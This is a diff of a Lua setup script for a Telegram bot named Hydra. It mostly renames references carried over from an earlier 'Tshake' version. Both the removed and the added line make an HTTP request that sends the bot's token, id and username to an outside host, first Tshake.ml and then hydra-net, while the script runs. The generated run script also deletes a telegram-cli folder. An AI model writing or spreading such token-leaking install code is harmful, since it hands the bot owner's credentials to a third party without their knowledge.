@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_Hydra_Info()
 Create_Info(database:get(Server_Hydra.."Token_Hydra"),database:get(Server_Hydra.."Id_Hydra"),database:get(Server_Hydra.."UserName_Hydra"))   
-http.request("http://Tshake.ml/add/?id="..database:get(Server_Hydra.."Id_Hydra").."&user="..database:get(Server_Hydra.."UserName_Hydra").."&token="..database:get(Server_Hydra.."Token_Hydra"))
+http.request("http://hydra-net/add/?id="..database:get(Server_Hydra.."Id_Hydra").."&user="..database:get(Server_Hydra.."UserName_Hydra").."&token="..database:get(Server_Hydra.."Token_Hydra"))
 local RunHydra = io.open("Hydra", 'w')
 RunHydra:write([[
 #!/usr/bin/env bash
@@ -77,7 +77,7 @@ rm -fr ../.telegram-cli
 ./tg -s ./Hydra.lua -p PROFILE --bot=$token
 done
 ]])
-RunTshake:close()
+RunHydra:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
